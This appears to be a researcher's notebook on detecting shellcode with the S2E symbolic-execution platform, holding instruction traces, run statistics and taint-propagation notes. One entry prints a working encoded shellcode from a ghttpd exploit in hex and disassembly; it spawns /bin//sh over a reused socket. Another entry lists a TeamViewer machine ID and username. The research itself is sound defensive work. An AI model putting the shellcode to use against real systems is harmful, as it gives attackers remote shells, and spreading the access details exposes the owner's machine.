>>    394: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    395: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    396: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    397: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    398: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    399: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    400: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    401: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    402: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    403: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    404: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    405: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    406: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    407: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    408: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    409: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    410: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    411: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    412: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    413: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    414: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    415: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    416: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    417: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    418: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    419: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    420: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    421: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    422: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    423: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    424: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    425: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    426: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    427: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    428: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    429: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    430: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    431: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    432: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    433: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    434: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    435: 56: 4  6B @0xbfc19cf7: 0f 85 d0 ff ff ff                  jnz dword 0xffffffffffffffd6 nextPC: 0xbfc19cfd


--------- 21 May
Making a iterative shellcode. 
Cut the ghttpd.rawshell into just the shellcode: dd bs=1 skip=464 count=88 if=ghttpd.rawshell of=ghttpd-isolated.rawshell
<< Requesting print out
<< From raw input
Shell start_addr: 0xffb26f80, +512: 0xffb27180, length: 88B, range: 88B, end_addr: 0xffb26fd7
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xffb26f80 909029c9 83e9f0d9 eed97424 f45b8173  ..).......t$.[.s
0xffb26f90 1349d4d6 2183ebfc e2f431d2 5289e56a  .I..!.....1.R..j
0xffb26fa0 075b6a10 54555289 e1ff016a 6658cd80  .[j.TUR....jfX..
0xffb26fb0 66817d02 8fff75f1 5b6a0259 b03fcd80  f.}...u.[j.Y.?..
0xffb26fc0 4979f952 682f2f73 68682f62 696e89e3  Iy.Rh//shh/bin..
0xffb26fd0 525389e1 b00bcd80                    RS......   
00000000  90                nop
00000001  90                nop
00000002  29C9              sub ecx,ecx
00000004  83E9F0            sub ecx,byte -0x10
00000007  D9EE              fldz
00000009  D97424F4          fnstenv [esp-0xc]
0000000D  5B                pop ebx
0000000E  81731349D4D621    xor dword [ebx+0x13],0x21d6d449
00000015  83EBFC            sub ebx,byte -0x4
00000018  E2F4              loop 0xe
; it looks like it was encoded, and the above is the decoding loop
0000001A  31D2              xor edx,edx
0000001C  52                push edx
0000001D  89E5              mov ebp,esp
0000001F  6A07              push byte +0x7
00000021  5B                pop ebx
00000022  6A10              push byte +0x10
00000024  54                push esp
00000025  55                push ebp
00000026  52                push edx
00000027  89E1              mov ecx,esp
00000029  FF01              inc dword [ecx]
0000002B  6A66              push byte +0x66
0000002D  58                pop eax
0000002E  CD80              int 0x80
00000030  66817D028FFF      cmp word [ebp+0x2],0xff8f
00000036  75F1              jnz 0x29
00000038  5B                pop ebx
00000039  6A02              push byte +0x2
0000003B  59                pop ecx
0000003C  B03F              mov al,0x3f
0000003E  CD80              int 0x80
00000040  49                dec ecx
00000041  79F9              jns 0x3c
00000043  52                push edx
00000044  682F2F7368        push dword 0x68732f2f
00000049  682F62696E        push dword 0x6e69622f
0000004E  89E3              mov ebx,esp
00000050  52                push edx
00000051  53                push ebx
00000052  89E1              mov ecx,esp
00000054  B00B              mov al,0xb
00000056  CD80              int 0x80




---------------3 June
Why is s2e stopping after 2.1K offsets with 10K buffers?
[s2e@s2e:~/s2e/dasos/s2e-last]$ cat run.stats | sed "s/,.*//" | sort | uniq
(0
(1
(2
('NumStates'
There are only ever two states.
[s2e@s2e:~/s2e/dasos/s2e-last]$ wc -l run.stats 
1819 run.stats
There were 1817 gathering points. (wall time matches that Process ran for 2048 seconds, doing 2019 states)
('NumStates','NumQueries','NumQueryConstructs','NumObjects','TranslationBlocks','TranslationBlocksConcrete','TranslationBlocksKlee','CpuInstructions','CpuInstructionsConcrete','CpuInstructionsKlee','ConcreteModeTime','SymbolicModeTime','UserTime','WallTime','QueryTime','SolverTime','CexCacheTime','ForkTime','ResolveTime','MemoryUsage',)
I checked the code base and there are no pointers. Only variable sized objects are the vectors. Ensure that terminateStateEarly handles these. Otherwise the memory growth is due to the state forking possibly. Or some other s2e component





[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl live-noeip.txt
Ranking Termination Reasons from live-noeip.txt
      2 Positive
    340 Unexpected OOB Jump
      6 Runaway Other
      8 Invalid OOB Jump
    539 Invalid First Insn
     99 FP Subset
      3 FP Wrong EAX
     24 FP Irregular EAX
      3 Fatal Signal OS
   1024 Total

First timer: 55
Last timer:  994
Difference:  939
t (secs) / offset, tot: 1.03018108651911 after activated: 1.09052183173589

Failed Constraint,126 12.3287671232877%
Invalid Instruction,542 53.0332681017613%
Other Exec Failure,354 34.6379647749511%

FP Irregular EAX,24
FP Subset,99
FP Wrong EAX,3
Fatal Signal OS,3
Invalid First Insn,539
Invalid OOB Jump,8
Positive,2
Runaway Other,6
Unexpected OOB Jump,340


[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl live-noeax.txt
Ranking Termination Reasons from live-noeax.txt
    257 Unexpected OOB Jump
     24 Runaway Other
      6 Invalid OOB Jump
    539 Invalid First Insn
    191 FP Subset
      0 Fatal Signal OS
      7 Positive
   1024 Total

First timer: 57
Last timer:  1161
Difference:  1104
t (secs) / offset, tot: 0.881998277347115 after activated: 0.927536231884058

Failed Constraint,191 18.7807276302852%
Invalid Instruction,539 52.9990167158309%
Other Exec Failure,287 28.220255653884%

FP Subset,191
Fatal Signal OS,0
Invalid First Insn,539
Invalid OOB Jump,6
Positive,7
Runaway Other,24
Unexpected OOB Jump,257



[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl null-noeip.txt
Ranking Termination Reasons from null-noeip.txt
     24 Unexpected OOB Jump
      6 Invalid OOB Jump
    981 Invalid First Insn
     11 FP Subset
      0 Fatal Signal OS
      2 Positive
   1024 Total

First timer: 57
Last timer:  1062
Difference:  1005
t (secs) / offset, tot: 0.964218455743879 after activated: 1.01890547263682

Failed Constraint,11 1.07632093933464%
Invalid Instruction,981 95.9882583170254%
Other Exec Failure,30 2.93542074363992%

FP Subset,11
Fatal Signal OS,0
Invalid First Insn,981
Invalid OOB Jump,6
Positive,2
Unexpected OOB Jump,24


[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl null-noeax.txt
Ranking Termination Reasons from null-noeax.txt
      2 Runaway Kernel
     20 Unexpected OOB Jump
      1 Runaway Other
      7 Invalid OOB Jump
    981 Invalid First Insn
     11 FP Subset
      0 Fatal Signal OS
      2 Positive
   1024 Total

First timer: 65
Last timer:  1024
Difference:  959
t (secs) / offset, tot: 1 after activated: 1.06777893639208

Failed Constraint,11 1.07632093933464%
Invalid Instruction,981 95.9882583170254%
Other Exec Failure,30 2.93542074363992%

FP Subset,11
Fatal Signal OS,0
Invalid First Insn,981
Invalid OOB Jump,7
Positive,2
Runaway Kernel,2
Runaway Other,1
Unexpected OOB Jump,20


Ranking Termination Reasons from ../null-neither
First timer: 63
Last timer:  1061
Difference:  998
t (secs) / offset, tot: 0.965127238454288 after activated: 1.02605210420842


for f in *; do echo $f && ../r.pl $f | grep "[:|%]" | tail -4; done











https://s2e.epfl.ch/embedded/s2e/Howtos/Debugging.html
It is possible to attach GDB to any running instance of S2E. S2E relies on the QEMU GDB interface, which can be enabled with the -s command line option. This option creates a socket on port number 1234.

$ ./i386-s2e-softmmu/qemu  -s2e-config-file config.lua -s
Once the guest is launched and the program is running, attach GDB to it.

$ gdb /path/to/my/prog
(gdb) target remote localhost:1234
#use gdb as usual (set breakpoints, source directories, single-step, etc.).




  1:  1: 2  5B @0x08b2418c: e8 e1 ff ff ff                     call 0xffffffffffffffe6  nextPC: 0x08b24172
29 [State 1] Testing whether data at 8b2417e is symbolic:29 [State 1]  true
29 [State 1] Testing whether data at 8b241a1 is symbolic:29 [State 1]  false
 >> oTBS pc: 0x08b24172 tb_seq_num: 3
 >> oTIE pc: 0x08b24172:0x02 nextpc: 8b24173 len: 1
  0:  2: 3  1B @0x08b24172: 5e                                 pop esi                  nextPC: 0x08b24173
 >> oTIE pc: 0x08b24173:0x03 nextpc: 8b24175 len: 2
  0:  3: 3  2B @0x08b24173: 89 f7                              mov edi, esi             nextPC: 0x08b24175
 >> oTIE pc: 0x08b24175:0x05 nextpc: 8b24177 len: 2
  0:  4: 3  2B @0x08b24175: 89 f2                              mov edx, esi             nextPC: 0x08b24177
 >> oTIE pc: 0x08b24177:0x07 nextpc: 8b2417c len: 5
  0:  5: 3  5B @0x08b24177: b9 29 00 00 00                     mov ecx, 0x29            nextPC: 0x08b2417c
KLEE: WARNING: silently concretizing (reason: memory access from concrete code) expression (Read w8 0 v1_key_1) to value 0 (:0)
 >> oTIE pc: 0x08b2417c:0x0c nextpc: 8b24181 len: 5
  0:  6: 3  5B @0x08b2417c: bb ff 00 00 00                     mov ebx, 0xff            nextPC: 0x08b24181
 >> oTIE pc: 0x08b24181:0x11 nextpc: 8b24183 len: 2
  0:  7: 3  2B @0x08b24181: 31 c0                              xor eax, eax             nextPC: 0x08b24183
 >> oTIE pc: 0x08b24183:0x13 nextpc: 8b24184 len: 1
  0:  8: 3  1B @0x08b24183: 50                                 push eax                 nextPC: 0x08b24184
 >> oTIE pc: 0x08b24184:0x14 nextpc: 8b24185 len: 1
  0:  9: 3  1B @0x08b24184: ac                                 lodsb                    nextPC: 0x08b24185
 >> oTIE pc: 0x08b24185:0x15 nextpc: 8b24187 len: 2
  0: 10: 3  2B @0x08b24185: 31 d8                              xor eax, ebx             nextPC: 0x08b24187
 >> oTIE pc: 0x08b24187:0x17 nextpc: 8b24188 len: 1
  0: 11: 3  1B @0x08b24187: aa                                 stosb                    nextPC: 0x08b24188
 >> oTBE Target by pc: 0x08b24188 to pc: 0x08b2418a
 >> oTBE Target by pc: 0x08b24188 to pc: 0x08b24184
 >> oTIE pc: 0x08b24188:0x18 nextpc: 8b24184 len: 2
  0: 12: 3  2B @0x08b24188: e2 fa                              loop 0xfffffffffffffffc  nextPC: 0x08b24184
 >> oExc pc: 0x08b24172 exception_idx: 239(0xef)
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 3
 >> oEI pc: 0x08b24172
  2:  2: 3  1B @0x08b24172: 5e                                 pop esi                  nextPC: 0x08b24173
29 [State 1] Testing whether data at 8b2417e is symbolic:29 [State 1]  false
29 [State 1] Testing whether data at 8b241a1 is symbolic:29 [State 1]  false






  1:  1: 2  5B @0x0925318c: e8 e1 ff ff ff                     call 0xffffffffffffffe6  nextPC: 0x09253172
28 [State 1] Testing whether data at 925317d is symbolic:28 [State 1]  true
28 [State 1] Testing whether data at 92531a1 is symbolic:28 [State 1]  false
 >> oTBS pc: 0x09253172 tb_seq_num: 3
 >> oTIE pc: 0x09253172:0x02 nextpc: 9253173 len: 1
  0:  2: 3  1B @0x09253172: 5e                                 pop esi                  nextPC: 0x09253173
 >> oTIE pc: 0x09253173:0x03 nextpc: 9253175 len: 2
  0:  3: 3  2B @0x09253173: 89 f7                              mov edi, esi             nextPC: 0x09253175
 >> oTIE pc: 0x09253175:0x05 nextpc: 9253177 len: 2
  0:  4: 3  2B @0x09253175: 89 f2                              mov edx, esi             nextPC: 0x09253177
 >> oTIE pc: 0x09253177:0x07 nextpc: 925317c len: 5
  0:  5: 3  5B @0x09253177: b9 29 00 00 00                     mov ecx, 0x29            nextPC: 0x0925317c
KLEE: WARNING: silently concretizing (reason: memory access from concrete code) expression (Read w8 0 v1_key_1) to value 0 (:0)
 >> oTIE pc: 0x0925317c:0x0c nextpc: 9253181 len: 5
  0:  6: 3  5B @0x0925317c: bb 00 00 00 00                     mov ebx, 0x0             nextPC: 0x09253181
 >> oTIE pc: 0x09253181:0x11 nextpc: 9253183 len: 2
  0:  7: 3  2B @0x09253181: 31 c0                              xor eax, eax             nextPC: 0x09253183
 >> oTIE pc: 0x09253183:0x13 nextpc: 9253184 len: 1
  0:  8: 3  1B @0x09253183: 50                                 push eax                 nextPC: 0x09253184
 >> oTIE pc: 0x09253184:0x14 nextpc: 9253185 len: 1
  0:  9: 3  1B @0x09253184: ac                                 lodsb                    nextPC: 0x09253185
 >> oTIE pc: 0x09253185:0x15 nextpc: 9253187 len: 2
  0: 10: 3  2B @0x09253185: 31 d8                              xor eax, ebx             nextPC: 0x09253187
 >> oTIE pc: 0x09253187:0x17 nextpc: 9253188 len: 1
  0: 11: 3  1B @0x09253187: aa                                 stosb                    nextPC: 0x09253188
 >> oTBE Target by pc: 0x09253188 to pc: 0x0925318a
 >> oTBE Target by pc: 0x09253188 to pc: 0x09253184
 >> oTIE pc: 0x09253188:0x18 nextpc: 9253184 len: 2
  0: 12: 3  2B @0x09253188: e2 fa                              loop 0xfffffffffffffffc  nextPC: 0x09253184
 >> oEI pc: 0x09253172
  2:  2: 3  1B @0x09253172: 5e                                 pop esi                  nextPC: 0x09253173
28 [State 1] Testing whether data at 925317d is symbolic:28 [State 1]  false
28 [State 1] Testing whether data at 92531a1 is symbolic:28 [State 1]  false
 >> oEI pc: 0x09253173








Dec 2013
Establishing a new network at my new house:
Florida (vmware host) is set up to ask for a DHCP, so you'll need to set your router to give the proper IP (eg anything you want). S2E has the /etc/network/interfaces file modified to make eth0 request a DHCP >> EOF;
auto eth0
iface eth0 inet dhcp
EOF
So you'll nee dto set your router to give it the proper IP (eg anything you want). S2E runs "TeamViewer" which is a centralized server managed vnc service. This allows you to access the machine from anywhere without knowing its IP address. Its information is s2e-demo (971229718) and can be quickly accessed with the TeamViewer username of rfarley3 and my password. Once logged into TeamViewer you click on s2e-demo and give it the machine's password which is the lab standard non-priv user password.
I currently set my home laptop to act as a wireless-eth bridge by using the Mac Internet Sharing option (http://osxdaily.com/2012/01/05/enable-internet-sharing-mac-os-x/), which makes my machine a NATd/DHCPd/router on 192.168.2.1/24. Fla is .2 and s2e is .3.


sudo vi /etc/resolv.conf nameserver 8.8.8.8
sudo vi /etc/network/interfaces iface eth0 inet dhcp\n   dns-nameservers 8.8.8.8
The other google dns server is 8.8.4.4
The above is not persistent, the below is, across all network changes:
sudo vi /etc/dhcp3/dhclient.conf
prepend domain-name-servers 8.8.8.8, 8.8.4.4;




http://ccadar.github.io/klee/KQuery.html#Concat_expr
KQueryLanguage




11 Feb 2014
; whatever B to hold original value to be good for exec
; still symbolic so taint is propogated

; do XOR on one of the bytes a = X XOR Y, A XOR Y
; x = buf[3]
; buf[3] = x xor y
; mark y symb
; buf[3] = buf[3] xor y
; now buf[3] should be original value, but marked as symb <- 1st req
; now try to exec buf (so buf[3] is forced to be concretized) <- 2nd req


; also need to trace taint propogation
; buf[4] =^ buf[3]
; buf[4] =^ buf[3]
; now buf[4] is original value, but marked as symbolic (bc of buf[3] bc of y)

; now need to trace multiple taint propogations
; mark buf[5] as symbolic
; buf[6] =^ buf[5]



1 Mar 2014
Using symbolic propagation as a taint.
I made a mark symbolic wrapper that duplicates the s2e make symbolic: detected? Y propagrated? Y executable? N taint_survive_simplify? Y
void DasosPreproc::markSymb -> klee::ref<klee::Expr> symb = state->createSymbolicValue (klee::Expr::Int8, nameStr);
   propagation happens; however, when concretized, its value is 0 (ie original value is forgotten)
   In avalance addition, x (value in memory of 0x01) becomes expr (Read w8 0)
   y (value in memory of 0x02)
   x + y = z becomes: (Extract w8 0 (Add w32 (w32 2) (Concat w32 (w8 0) (Concat w24 (w8 0) (Concat w16 (w8 0) (Read w8 0 v1_x_1) ) ) ) ) )
   Extract 8b from 32b 2 (bc it was loaded into a 32b reg) plus v1_x_1 extended to 32b
   Also, the system did not detect the DMA: Symbolic memory accesses are not yet supported by MemoryChecker

   expression = "(" "Concat" [type] msb-expression lsb-expression ")"
   Concat evaluates to a type bits formed by concatenating lsb-expression to msb-expression.
   expression = "(" "Extract" type offset-number child-expression ")"
   Extract evaluates to type bits from child-expression taken from offset-number, where offset-number is the index of the least-significant bit in child-expression which should be extracted.
   

I made another mark symbolic wrapper that does the following: detected? Y propagrated? Y executable? ?
   klee::ref<klee::Expr> symb_const = klee::ConstantExpr::create ((uint8_t) buf, klee::Expr::Int8);
   klee::ref<klee::Expr> symb_taint = state->createSymbolicValue (klee::Expr::Int8, nameStr);
   klee::ref<klee::Expr> symb = klee::AddExpr::create (symb_const, symb_taint);
   results in (Add w8 (w8 <value in memory>) (Read w8 0 <taint name>) )
   
   28 [State 1] x (0x08362191) 28 [State 1] is concrete, val:  0x01; expr: 1
   28 [State 1] Inserting symbolic byte at 0x8362191 with name 'x' from memory value of 0x01
   28 [State 1] x (0x08362191) 28 [State 1] marked symbolic, expr: (Add w8 (w8 1) (Read w8 0 v1_x_1))
   28 [State 1] z (0x08362193) 28 [State 1] is concrete, val:  0x00; expr: 0
   28 [State 1] y (0x08362192) 28 [State 1] is concrete, val:  0x02; expr: 2

	// this adds a constraint to the state assigning a constant expr (tf value) as equal to our convoluted expr for tainting
	s2e()->getExecutor()->toConstant (*state, symb, "markSymbTagged");
   However, when reading the variable from mem, you get the formula, yet the taint no longer propagates
   S2E seems to be smart enough to use the EqExpr as teh simplified form for futher computations. The allows datatrace to work.
   Further toConstant calls exit early bc expr now Constant not add duplicate Exprs upon repeated calls to toConstant (unless thats bc it exits on if ConstantExpr?)
   

   29 [State 1] x (0x0a065191) 29 [State 1] is symbolic, expr: (Add w8 (w8 1) (Read w8 0 v1_x_1))
   29 [State 1] z (0x0a065193) 29 [State 1] is concrete, val:  0x00; expr: 0
   29 [State 1] y (0x0a065192) 29 [State 1] is concrete, val:  0x02; expr: 2
   29 [State 1] Symbolic memory accesses are not yet supported by MemoryChecker
    >> oEI pc: 0x0a065183
    10: 30: 5  1B @0x0a065183: aa                                 stosb                    nextPC: 0x0a065184
   29 [State 1] x (0x0a065191) 29 [State 1] is symbolic, expr: (Add w8 (w8 1) (Read w8 0 v1_x_1))
   29 [State 1] z (0x0a065193) 29 [State 1] is symbolic, expr: (Extract w8 0 (Add w32 (w32 2)
   0000000000000000000000 (Concat w32 (w8 0)
   0000000000000000000000000000000000 (Concat w24 (w8 0)
   0000000000000000000000000000000000000000000000 (Concat w16 (w8 0)
   0000000000000000000000000000000000000000000000000000000000 (Add w8 (w8 1) (Read w8 0 v1_x_1))))))) 29 [State 1] is symbolic, simplified expr: (Extract w8 0 (Add w32 (w32 2)
   0000000000000000000000 (Concat w32 (w8 0)
   0000000000000000000000000000000000 (Concat w24 (w8 0)
   0000000000000000000000000000000000000000000000 (Concat w16 (w8 0)
   0000000000000000000000000000000000000000000000000000000000 (Add w8 (w8 1) (Read w8 0 v1_x_1))))))) KLEE: WARNING: silently concretizing (reason: test concretize) expression (Extract w8 0 (Add w32 (w32 2)
                          (Concat w32 (w8 0)
                                      (Concat w24 (w8 0)
                                                  (Concat w16 (w8 0)
                                                              (Add w8 (w8 1) (Read w8 0 v1_x_1))))))) to value 3 (:0)
   29 [State 1] toConstant, expr: 3 29 [State 1] constraints.size: 2
   
   
   

   klee::ref<klee::Expr> symb_const = klee::ConstantExpr::create ((uint8_t) buf, klee::Expr::Int8);
   klee::ref<klee::Expr> symb_taint = klee::ConstantExpr::create (0, klee::Expr::Int8);
   klee::ref<klee::Expr> symb = klee::AddExpr::create (symb_const, symb_taint);
   results in (Add w8 (w8 <value in memory>) (w8 0) )
   

2 March 2014
From forum:
   In concolic mode, each symbolic variable has a concrete value assigned to it, it is stored in ExecutionState::concolics. 
   You can use the methods of the klee::Assignment class to get these values.
   pair<ref<Expr>, ref<Expr> > range = s2e()->getExecutor()->getSolver()->getRange(Query(state->constraints, parameter));
   s2e_get_example() (from guest/include/s2e.h) is called. This calls concretize() in s2e/Plugins/BaseInstructions.cpp, which in turn calls readMemoryConcrete8 in s2e/S2EExecutionState.cpp, which calls toConstantSilent in klee/lib/Core/Executor.cpp, which calls the solver to get an example concrete value.
ref<klee::ConstantExpr> Executor::toConstantSilent(ExecutionState &state, ref<Expr> e) {
  e = simplifyExpr(state, e);
  e = state.constraints.simplifyExpr(e);
  if (ConstantExpr *CE = dyn_cast<ConstantExpr>(e))
    return CE;
  ref<ConstantExpr> value;
  bool success = solver->getValue(state, e, value);
  assert(success && "FIXME: Unhandled solver failure");
  (void) success;
  addConstraint(state, EqExpr::create(e, value));
  
  
    
Examining executing symbolic code: "silently concretizing (reason: memory access from concrete code) ..."
This output comes from /home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutionState.cpp::void S2EExecutionState::readRamConcrete(uint64_t hostAddress, uint8_t* buf, uint64_t size)
    'memory access from concrete code'
  if symb is found, then this function outputs this error, which is what happens when I execute symbolic code.
  could I put in a hook here? to alert my plugin that memory just got concretized?
  
 
3 March 2014
I made a BasicTaint that mimics a bad objcpy that uses a sizeof/strlen on the untrusted input. It uses a countdown loop (ecx = 8 = strlen (untrusted_obj); loop) vs the old one that mimics a bad strcpy looking for a null terminator (via cmp 0, al; jne). The old one forked 255 states for every cmp. The new one forks only on the overwritten ret. Here is an example state it creates:

Notice how the lower 4 bytes are correct. So why is this trying to make it a 64b address? It's only a 32b guest system.


31 [State 1] forkAndConcretize((ZExt w64 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf0007_8))
000000000000000000000 (Concat w24 (Add w8 (w8 15) (Read w8 0 v7_buf0006_7))
000000000000000000000000000000000 (Concat w16 (Add w8 (w8 177) (Read w8 0 v6_buf0005_6))
000000000000000000000000000000000000000000000 (Add w8 (w8 122) (Read w8 0 v5_buf0004_5)))))))
32 [State 1] Dropping states with constraint 
(Ule (ZExt w64 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf0007_8))
                           (Concat w24 (Add w8 (w8 15) (Read w8 0 v7_buf0006_7))
                                       (Concat w16 (Add w8 (w8 177) (Read w8 0 v6_buf0005_6))
                                                   (Add w8 (w8 122) (Read w8 0 v5_buf0004_5))))))
     (w64 256))
 becase max-forks-on-concretize limit was reached.
35 [State 1] Forking state 1 at pc = 0x80fb1d6 [d6 is the ret insns] into states:
    state 1 with condition (Eq (w32 0)
000 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf0007_8))
000000000000000 (Concat w24 (Add w8 (w8 15) (Read w8 0 v7_buf0006_7))
000000000000000000000000000 (Concat w16 (Add w8 (w8 177) (Read w8 0 v6_buf0005_6))
000000000000000000000000000000000000000 (Add w8 (w8 122) (Read w8 0 v5_buf0004_5))))))
...
    state 256 with condition (Eq (w32 255)
000 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf_8))
000000000000000 (Concat w24 (Add w8 (w8 83) (Read w8 0 v7_buf_7))
000000000000000000000000000 (Concat w16 (Add w8 (w8 97) (Read w8 0 v6_buf_6))
000000000000000000000000000000000000000 (Add w8 (w8 122) (Read w8 0 v5_buf_5))))))

Stack frame at fork:
s2e_dummyMainFunction
tcg-llvm-tb-6-80fb1d3
Size=256 Low=0 splitIndex=128 high=255
 >> oEB pc: 0x080fb1d6
 >> oEI pc: 0x080fb1d6
 43: 31: 9  1B @0x080fb1d6: c3                                 ret                      nextPC: 0x080fb1cf
36 [State 1] buf (0x080fb184) 36 [State 1] is symbolic, expr: (Add w8 (w8 85) (Read w8 0 v1_buf0000_1))

37 [State 245] buf (0x080fb184) 37 [State 245] is symbolic, expr: (Add w8 (w8 85) (Read w8 0 v1_buf0000_1))
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 0
 >> oPC prev: 0 curr: 0
 >> oPC prev: 0 curr: 0
 >> oPC prev: 0 curr: 3
 >> oPF addr: 0x000000f4 iswrite: 1
 
 All states fail with the EIP messed up. Its value is the state num (the oPF addr).
 Also note that it max'ed out and didn't do any (Ule (ZExt w64 retaddr) (w64 256) ), why 64b?!
 


 Comparisons
 Eq, Ne, Ult, Ule, Ugt, Uge, Slt, Sle, Sgt, Sge
 Syntax: s.t. U = unsigned, S = signed, lt = less than, le = less than or equal, g = greater
 comparison-expr-kind = ( "Eq" | "Ne" | "Ult" | "Ule" | "Ugt" | "Uge" | "Slt" | "Sle" | "Sgt" | "Sge" )
 expression = "(" comparison-expr-kind [ type ] expression expression ")"
 Comparison operations are always binary and the types of the left- and right-hand side expression must match. If the type is specified, it must be w1.
 

 [s2e@s2e:~/s2e/dasos/SymbolicTaintTesting]$ cat ../s2e-last/debug.txt | grep "oDMA " | grep "seq_num: 11" # fetch legit_retaddr
  >> oDMA ESP/push Write by seq_num: 11 pc: 0x80fb194:0x24 to addr: 0xbff60138 len: 4B value:  0x99  0xb1  0x0f  0x08
 [s2e@s2e:~/s2e/dasos/SymbolicTaintTesting]$ cat ../s2e-last/debug.txt | grep "oDMA W"  # fetch evil_retaddr or | grep "oDMA " | grep "seq_num: 6"
  >> oDMA Write by seq_num: 6 pc: 0x80fb1bc:0x4c to addr: 0x80fb188 len: 4B value:  0x7a  0xb1  0x0f  0x08 
 [s2e@s2e:~/s2e/dasos/SymbolicTaintTesting]$ cat ../s2e-last/debug.txt | grep "left b" | sed -e 's/.*@//' | sed -e 's/,.*//' | uniq  # fetch actual retaddr
 0x08049ace --> 0xce 0x9a 0x04 0x08
 
 [s2e@s2e:~/s2e/dasos]$ ./searchSource.sh forkAndConcretize
 /home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.cpp:477:    g_s2e->getDebugStream(s2eState) << "forkAndConcretize(" << expr << ")" << std::endl;
  
  
 From Wang: Catch silent concrete, store symb value, let it be concretized, observe all writes, restore symb value, taint all writes
 
 
 
 For vi highlighting while paging through files:
 /usr/share/vim/vim72/macros/less.sh
 
 
 
 
 
 void ObjectState::write(ref<Expr> offset, ref<Expr> value) {
   // Truncate offset to 32-bits.
   offset = ZExtExpr::create(offset, Expr::Int32);  // RJF it always makes w32 extended expressions
  
   // Check for writes at constant offsets.
   if (ConstantExpr *CE = dyn_cast<ConstantExpr>(offset)) {  // RJF this only works 
     write(CE->getZExtValue(32), value);
     return;
   } 
    
   // Treat bool specially, it is the only non-byte sized write we allow.
   Expr::Width w = value->getWidth();
   if (w == Expr::Bool) {
     write8(offset, ZExtExpr::create(value, Expr::Int8));
     return;
   }

   // Otherwise, follow the slow general case.
   unsigned NumBytes = w / 8;
